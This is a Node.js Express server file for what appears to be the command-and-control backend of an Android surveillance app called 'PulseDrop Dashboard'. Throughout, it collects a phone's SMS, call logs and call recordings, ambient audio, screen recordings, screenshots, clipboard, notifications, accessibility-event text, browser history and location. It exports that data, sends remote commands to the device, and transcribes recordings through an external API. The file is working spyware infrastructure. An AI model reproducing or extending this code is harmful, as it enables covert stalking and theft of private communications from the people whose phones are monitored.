const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

const config = require('./config');
const { db, insert, all, count, deleteByDevice } = require('./database');
const { requireAuth, requireDeviceAuth, login, logout, loadSavedHash } = require('./auth');
const { setupWebSocket, sendCommandToDevice, isDeviceOnline, getConnectedDevices } = require('./websocket');

// Load saved admin password
loadSavedHash();

// Ensure upload directories
const uploadDir = config.UPLOAD_DIR;
['call_recordings', 'screen_recordings', 'screenshots', 'ambient_audio', 'media'].forEach(d => {
  fs.mkdirSync(path.join(uploadDir, d), { recursive: true });
});

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
  secret: config.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: config.USE_HTTPS, maxAge: 86400000 }
}));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// --- File upload config ---
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const type = req.body.type || 'misc';
    const subdir = type === 'call_recording' ? 'call_recordings'
      : type === 'screen_recording' ? 'screen_recordings'
      : type === 'screenshot' ? 'screenshots'
      : type === 'ambient_audio' ? 'ambient_audio'
      : 'media';
    cb(null, path.join(uploadDir, subdir));
  },
  filename: (req, file, cb) => {
    const deviceId = req.deviceId || 'unknown';
    cb(null, `${deviceId}_${Date.now()}_${file.originalname}`);
  }
});
const upload = multer({ storage, limits: { fileSize: config.MAX_FILE_SIZE_MB * 1024 * 1024 } });

// ============ AUTH ROUTES ============

app.post('/api/login', (req, res) => login(req, res));
app.post('/api/logout', requireAuth, (req, res) => logout(req, res));
app.get('/api/auth-status', (req, res) => {
  res.json({ authenticated: !!(req.session && req.session.authenticated) });
});

// ============ DEVICE API (APK -> SERVER) ============

app.post('/api/upload', requireDeviceAuth, (req, res) => {
  const { type, data } = req.body;
  const deviceId = req.deviceId;
  const now = Date.now();

  // Upsert device
  db.prepare(`INSERT OR REPLACE INTO devices (device_id, last_heartbeat, status) VALUES (?, ?, 'online')`)
    .run(deviceId, now);

  try {
    switch (type) {
      case 'location':
        insert('locations', {
          device_id: deviceId, lat: data.lat, lon: data.lon,
          accuracy: data.accuracy, altitude: data.altitude, speed: data.speed,
          provider: data.provider, timestamp: data.timestamp || now
        });
        break;
      case 'geofence':
        insert('geofence_events', {
          device_id: deviceId, geofence_id: data.geofenceId,
          transition: data.transition, lat: data.lat, lon: data.lon,
          timestamp: data.timestamp || now
        });
        break;
      case 'sms':
        insert('sms_messages', {
          device_id: deviceId, message_id: data.id, address: data.address,
          body: data.body, type: data.type, timestamp: data.timestamp,
          read: data.read ? 1 : 0
        });
        break;
      case 'call_log':
        insert('call_logs', {
          device_id: deviceId, call_id: data.id, number: data.number,
          contact_name: data.contactName, type: data.type,
          duration_seconds: data.durationSeconds,
          recording_file: data.recordingFileName || null,
          timestamp: data.timestamp
        });
        break;
      case 'contact':
        insert('contacts', {
          device_id: deviceId, contact_id: data.id, name: data.name,
          phone_numbers: JSON.stringify(data.phoneNumbers || []),
          emails: JSON.stringify(data.emails || []),
          timestamp: now
        });
        break;
      case 'media':
        insert('media_items', {
          device_id: deviceId, media_id: data.id, type: data.type,
          file_name: data.fileName, file_path: data.filePath,
          size_bytes: data.sizeBytes, timestamp: data.timestamp
        });
        break;
      case 'device_info':
        insert('device_info', {
          device_id: deviceId, battery_level: data.batteryLevel,
          is_charging: data.isCharging ? 1 : 0, network_type: data.networkType,
          wifi_ssid: data.wifiSsid, ip_address: data.ipAddress,
          device_model: data.deviceModel, manufacturer: data.manufacturer,
          os_version: data.osVersion, sdk_int: data.sdkInt,
          sim_status: data.simStatus, sim_operator: data.simOperator,
          timestamp: data.timestamp || now
        });
        break;
      case 'sim_change':
        insert('sim_change_events', {
          device_id: deviceId, previous_operator: data.previousSimOperator,
          new_operator: data.newSimOperator, timestamp: data.timestamp || now
        });
        break;
      case 'browser_history':
        insert('browser_history', {
          device_id: deviceId, history_id: data.id, title: data.title,
          url: data.url, visits: data.visits, last_visited: data.lastVisited
        });
        break;
      case 'browser_bookmark':
        insert('browser_bookmarks', {
          device_id: deviceId, bookmark_id: data.id, title: data.title,
          url: data.url, created: data.created
        });
        break;
      case 'installed_app':
        // Replace app list per upload
        db.prepare(`DELETE FROM installed_apps WHERE device_id = ?`).run(deviceId);
        // Note: apps come one at a time; batch logic in device
        insert('installed_apps', {
          device_id: deviceId, package_name: data.packageName,
          app_name: data.appName, version_name: data.versionName,
          version_code: data.versionCode, install_time: data.installTime,
          is_system_app: data.isSystemApp ? 1 : 0, timestamp: now
        });
        break;
      case 'app_event':
        insert('app_events', {
          device_id: deviceId, package_name: data.packageName,
          event: data.event, timestamp: data.timestamp || now
        });
        break;
      case 'clipboard':
        insert('clipboard_entries', {
          device_id: deviceId, text: data.text, timestamp: data.timestamp || now
        });
        break;
      case 'notification':
        insert('notifications', {
          device_id: deviceId, notification_id: data.id,
          package_name: data.packageName, app_name: data.appName,
          title: data.title, text: data.text, timestamp: data.timestamp
        });
        break;
      case 'accessibility':
        insert('accessibility_events', {
          device_id: deviceId, package_name: data.packageName,
          text: data.text, class_name: data.className,
          timestamp: data.timestamp || now
        });
        break;
      default:
        return res.status(400).json({ error: `Unknown type: ${type}` });
    }
    res.json({ status: 'received' });
  } catch (e) {
    console.error('Upload error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/upload-file', requireDeviceAuth, upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
  const type = req.body.type || 'misc';
  insert('files', {
    device_id: req.deviceId, type, file_name: req.file.filename,
    stored_path: req.file.path, size_bytes: req.file.size, timestamp: Date.now()
  });
  res.json({ status: 'received', file: req.file.filename, id: req.file.filename });
});

// ============ DASHBOARD API ============

app.get('/api/devices', requireAuth, (req, res) => {
  const devices = db.prepare(`SELECT * FROM devices ORDER BY last_heartbeat DESC`).all();
  devices.forEach(d => { d.online = isDeviceOnline(d.device_id); });
  res.json(devices);
});

// Generic data fetch
app.get('/api/data/:type', requireAuth, (req, res) => {
  const { type } = req.params;
  const deviceId = req.query.device_id;
  const limit = parseInt(req.query.limit) || 500;

  const tableMap = {
    'locations': 'locations',
    'geofence': 'geofence_events',
    'sms': 'sms_messages',
    'calls': 'call_logs',
    'contacts': 'contacts',
    'media': 'media_items',
    'device-info': 'device_info',
    'sim-changes': 'sim_change_events',
    'browser-history': 'browser_history',
    'browser-bookmarks': 'browser_bookmarks',
    'apps': 'installed_apps',
    'app-events': 'app_events',
    'clipboard': 'clipboard_entries',
    'notifications': 'notifications',
    'accessibility': 'accessibility_events',
    'files': 'files',
    'commands': 'command_log'
  };

  const table = tableMap[type];
  if (!table) return res.status(400).json({ error: 'Unknown data type' });

  let rows;
  if (deviceId) {
    rows = db.prepare(`SELECT * FROM ${table} WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?`).all(deviceId, limit);
  } else {
    rows = db.prepare(`SELECT * FROM ${table} ORDER BY timestamp DESC LIMIT ?`).all(limit);
  }
  res.json(rows);
});

// Latest device info
app.get('/api/device-info/latest', requireAuth, (req, res) => {
  const deviceId = req.query.device_id;
  const row = db.prepare(`SELECT * FROM device_info WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1`).get(deviceId);
  res.json(row || null);
});

// Files list with type filter
app.get('/api/files', requireAuth, (req, res) => {
  const { type, device_id } = req.query;
  let sql = 'SELECT * FROM files';
  const params = [];
  const conditions = [];
  if (type) { conditions.push('type = ?'); params.push(type); }
  if (device_id) { conditions.push('device_id = ?'); params.push(device_id); }
  if (conditions.length) sql += ' WHERE ' + conditions.join(' AND ');
  sql += ' ORDER BY timestamp DESC LIMIT 500';
  res.json(db.prepare(sql).all(...params));
});

// --- Transcription & Translation ---
app.post('/api/transcribe/:fileId', requireAuth, async (req, res) => {
  const { targetLang } = req.body;
  const file = db.prepare(`SELECT * FROM files WHERE id = ?`).get(req.params.fileId);
  if (!file) return res.status(404).json({ error: 'File not found' });
  if (!config.OPENAI_API_KEY) return res.status(400).json({ error: 'OPENAI_API_KEY not configured' });

  try {
    const FormData = require('form-data');
    const form = new FormData();
    form.append('file', fs.createReadStream(file.stored_path));
    form.append('model', config.TRANSCRIBE_MODEL);

    const transcript = await fetch('https://api.openai.com/v1/audio/transcriptions', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${config.OPENAI_API_KEY}`, ...form.getHeaders() },
      body: form
    }).then(r => r.json());

    let translation = null;
    const lang = targetLang || config.DEFAULT_TARGET_LANG;

    if (transcript.text && lang !== 'en') {
      const transResp = await fetch('https://api.openai.com/v1/chat/completions', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${config.OPENAI_API_KEY}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          model: config.TRANSLATE_MODEL,
          messages: [
            { role: 'system', content: `Translate the following text to ${lang}. Output only the translation.` },
            { role: 'user', content: transcript.text }
          ]
        })
      }).then(r => r.json());
      translation = transResp.choices?.[0]?.message?.content || null;
    }

    db.prepare(`UPDATE files SET transcript = ?, transcript_lang = ?, translation = ?, target_lang = ? WHERE id = ?`)
      .run(transcript.text || '', transcript.language || '', translation, lang, file.id);

    res.json({ transcript: transcript.text, transcript_lang: transcript.language, translation, target_lang: lang });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// --- Export ---
app.get('/api/export/:type', requireAuth, (req, res) => {
  const { type } = req.params;
  const deviceId = req.query.device_id;
  const format = req.query.format || 'json';

  const tableMap = {
    'locations': 'locations', 'sms': 'sms_messages', 'calls': 'call_logs',
    'contacts': 'contacts', 'apps': 'installed_apps', 'clipboard': 'clipboard_entries',
    'notifications': 'notifications', 'browser-history': 'browser_history'
  };
  const table = tableMap[type];
  if (!table) return res.status(400).json({ error: 'Unknown export type' });

  let rows;
  if (deviceId) {
    rows = db.prepare(`SELECT * FROM ${table} WHERE device_id = ? ORDER BY timestamp DESC`).all(deviceId);
  } else {
    rows = db.prepare(`SELECT * FROM ${table} ORDER BY timestamp DESC`).all();
  }

  if (format === 'csv') {
    if (rows.length === 0) return res.send('');
    const headers = Object.keys(rows[0]);
    const csv = [
      headers.join(','),
      ...rows.map(r => headers.map(h => `"${String(r[h] ?? '').replace(/"/g, '""')}"`).join(','))
    ].join('\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="${type}_export.csv"`);
    return res.send(csv);
  }

  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="${type}_export.json"`);
  res.json(rows);
});

// --- Delete data ---
app.delete('/api/data/:type', requireAuth, (req, res) => {
  const { type } = req.params;
  const deviceId = req.query.device_id;
  const tableMap = {
    'locations': 'locations', 'sms': 'sms_messages', 'calls': 'call_logs',
    'contacts': 'contacts', 'media': 'media_items', 'apps': 'installed_apps',
    'clipboard': 'clipboard_entries', 'notifications': 'notifications',
    'accessibility': 'accessibility_events', 'files': 'files'
  };
  const table = tableMap[type];
  if (!table) return res.status(400).json({ error: 'Unknown type' });

  if (deviceId) {
    deleteByDevice(table, deviceId);
  } else {
    db.prepare(`DELETE FROM ${table}`).run();
  }
  res.json({ success: true });
});

// --- Remote commands ---
app.post('/api/command', requireAuth, async (req, res) => {
  const { device_id, command, payload } = req.body;
  if (!device_id || !command) return res.status(400).json({ error: 'device_id and command required' });

  try {
    const result = await sendCommandToDevice(device_id, command, payload || {});
    res.json(result);
  } catch (e) {
    res.status(503).json({ error: e.message });
  }
});

// --- Feature toggles ---
app.get('/api/toggles/:deviceId', requireAuth, (req, res) => {
  const row = db.prepare(`SELECT toggles_json FROM feature_toggles WHERE device_id = ?`).get(req.params.deviceId);
  res.json(row ? JSON.parse(row.toggles_json) : null);
});

app.post('/api/toggles/:deviceId', requireAuth, async (req, res) => {
  const toggles = req.body;
  db.prepare(`INSERT OR REPLACE INTO feature_toggles (device_id, toggles_json) VALUES (?, ?)`)
    .run(req.params.deviceId, JSON.stringify(toggles));

  // Push to device if online
  if (isDeviceOnline(req.params.deviceId)) {
    try {
      await sendCommandToDevice(req.params.deviceId, 'update_toggles', toggles);
    } catch (e) { /* device will sync later */ }
  }
  res.json({ success: true });
});

// --- Dashboard config (safe, no secrets) ---
app.get('/api/config', requireAuth, (req, res) => {
  res.json({
    transcriptionEnabled: !!config.OPENAI_API_KEY,
    defaultTargetLang: config.DEFAULT_TARGET_LANG,
    devices: getConnectedDevices()
  });
});

// ============ START SERVER ============

let server;
if (config.USE_HTTPS && fs.existsSync(config.SSL_KEY) && fs.existsSync(config.SSL_CERT)) {
  const options = {
    key: fs.readFileSync(config.SSL_KEY),
    cert: fs.readFileSync(config.SSL_CERT)
  };
  server = https.createServer(options, app);
  server.listen(config.HTTPS_PORT, () => {
    console.log(`PulseDrop Dashboard running on https://localhost:${config.HTTPS_PORT}`);
  });
} else {
  console.log('HTTPS certs not found, falling back to HTTP. For production, set up SSL.');
  server = http.createServer(app);
  server.listen(config.PORT, () => {
    console.log(`PulseDrop Dashboard running on http://localhost:${config.PORT}`);
  });
}

setupWebSocket(server);
